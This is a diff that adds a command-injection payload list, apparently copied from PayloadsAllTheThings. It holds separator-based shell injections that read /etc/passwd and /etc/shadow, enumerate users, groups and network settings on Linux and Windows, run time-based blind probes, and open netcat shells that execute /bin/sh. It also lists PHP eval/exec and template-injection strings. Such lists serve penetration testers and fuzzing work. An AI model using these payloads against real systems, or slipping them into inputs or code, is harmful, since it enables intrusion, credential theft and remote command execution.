@@ -1,0 +1,113 @@
+# Command Injection Comprehensive Payloads
+# Source: PayloadsAllTheThings
+
+# Basic Separators
+;
+|
+||
+&
+&&
+`
+$()
+%0a
+%0a%0d
+
+# Linux Commands
+; ls
+| ls
+|| ls
+& ls
+&& ls
+`ls`
+$(ls)
+; id
+| id
+; whoami
+| whoami
+& whoami
+&& whoami
+; pwd
+| pwd
+; uname -a
+| uname -a
+; cat /etc/passwd
+| cat /etc/passwd
+; cat /etc/shadow
+; ifconfig
+| ifconfig
+; netstat -an
+| netstat -an
+; ps aux
+
+# Windows Commands
+& dir
+| dir
+; dir
+&& dir
+& whoami
+| whoami
+& hostname
+& ipconfig /all
+& systeminfo
+& net user
+& net localgroup Administrators
+& type C:\Windows\win.ini
+& type C:\boot.ini
+
+# URL Encoded
+%0als
+%0aid
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0a id %0a
+
+# Blind - Time Based
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+; sleep 10
+| sleep 10
+& ping -c 5 127.0.0.1
+& ping -n 5 127.0.0.1
+
+# Concatenation
+a|id|
+a;id|
+a;id;
+;id\n
+\nid\n
+
+# Reverse Shell Triggers
+| nc -lvvp 4444 -e /bin/sh|
+; nc -lvvp 4444 -e /bin/sh;
+& nc -lvvp 4444 -e /bin/sh&
+
+# PHP Functions
+;{$_GET["cmd"]}
+;phpinfo()
+;phpinfo();//
+';phpinfo();//
+{${phpinfo()}}
+|| phpinfo()
+| phpinfo()
+
+# Eval/Exec
+eval('ls')
+eval('pwd')
+eval('whoami')
+exec('ls')
+exec('pwd')
+exec('whoami')
+system('ls')
+system('pwd')
+system('whoami')
+
+# Template Injection
+{{4+4}}
+{{4+8}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+${{7*7}}
+@(1+1)
